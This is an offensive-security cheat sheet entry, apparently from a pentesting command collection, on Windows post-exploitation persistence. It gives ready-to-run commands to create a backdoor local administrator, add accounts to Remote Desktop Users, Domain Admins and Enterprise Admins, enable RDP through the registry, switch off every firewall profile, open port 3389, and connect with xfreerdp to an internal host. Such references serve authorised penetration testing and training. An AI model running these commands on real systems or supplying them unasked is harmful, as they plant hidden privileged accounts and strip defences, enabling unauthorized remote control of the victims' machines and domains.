---
title: Add Admin User and Enable RDP
category: privesc
subcategory: windows-misc
os: windows
command: net user hacker password123 /add
tools: net, reg, netsh
---


### Add local admin

```cmd
net user hacker password123 /add
net localgroup administrators hacker /add
```

### With RDP group

```cmd
net localgroup "Remote Desktop Users" hacker /add
```

### Domain admin (if domain joined and we have rights)

```cmd
net user siren superPassword /add /DOMAIN
net localgroup Administrators siren /ADD /DOMAIN
net group "Domain Admins" siren /ADD /DOMAIN
net group "Enterprise Admins" siren /ADD /DOMAIN
```

### Enable RDP and disable firewall

```cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall set allprofiles state off
netsh firewall add portopening TCP 3389 "Remote Desktop"
```

### Connect

```bash
xfreerdp /u:alexis /p:hacker_123321 /v:10.2.18.93
```
